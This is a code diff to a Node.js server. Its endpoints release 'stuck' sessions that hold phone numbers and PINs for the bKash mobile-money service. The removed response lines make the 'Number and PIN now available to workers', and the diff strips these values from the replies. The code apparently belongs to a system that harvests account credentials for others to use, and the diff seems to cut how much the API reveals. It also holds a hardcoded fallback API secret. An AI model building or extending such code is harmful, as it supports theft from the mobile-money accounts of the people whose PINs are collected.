@@ -475,7 +475,7 @@ app.post('/api/release-stuck', (req, res) => {
   }
 
   if (!foundSession) {
-    return res.json({ success: false, phone: normalized, message: 'No stuck session found for this number' });
+    return res.json({ success: false });
   }
 
   const gatewayNumber = foundSession.gatewayPhone || foundSession.initialPhone || '';
@@ -494,23 +494,14 @@ app.post('/api/release-stuck', (req, res) => {
   };
   sessions[foundId] = updates;
   saveSession(foundId);
-  res.json({
-    success: true,
-    sessionId: foundId,
-    phone: normalized,
-    number: gatewayNumber,
-    pin: pin,
-    name: foundSession.name || '',
-    provider: foundSession.provider || 'bkash',
-    message: 'Session released. Number and PIN now available to workers.',
-  });
+  res.json({ success: true });
 });
 
 // GET version
 app.get('/api/release-stuck', (req, res) => {
   const phone = req.query?.phone;
   if (!phone) {
-    return res.status(400).json({ error: 'Missing phone parameter' });
+    return res.status(400).json({ success: false });
   }
 
   const normalized = normalizePhoneForLookup(phone);
@@ -530,11 +521,8 @@ app.get('/api/release-stuck', (req, res) => {
   }
 
   if (!foundSession) {
-    return res.json({ success: false, phone: normalized, message: 'No stuck session found for this number' });
+    return res.json({ success: false });
   }
-
-  const gatewayNumber = foundSession.gatewayPhone || foundSession.initialPhone || '';
-  const pin = foundSession.pin || '';
 
   const updates = {
     ...foundSession,
@@ -549,16 +537,7 @@ app.get('/api/release-stuck', (req, res) => {
   };
   sessions[foundId] = updates;
   saveSession(foundId);
-  res.json({
-    success: true,
-    sessionId: foundId,
-    phone: normalized,
-    number: gatewayNumber,
-    pin: pin,
-    name: foundSession.name || '',
-    provider: foundSession.provider || 'bkash',
-    message: 'Session released. Number and PIN now available to workers.',
-  });
+  res.json({ success: true });
 });
 
 const AI_API_KEY = process.env.AI_API_KEY || 'bkash-ai-secret-2025';
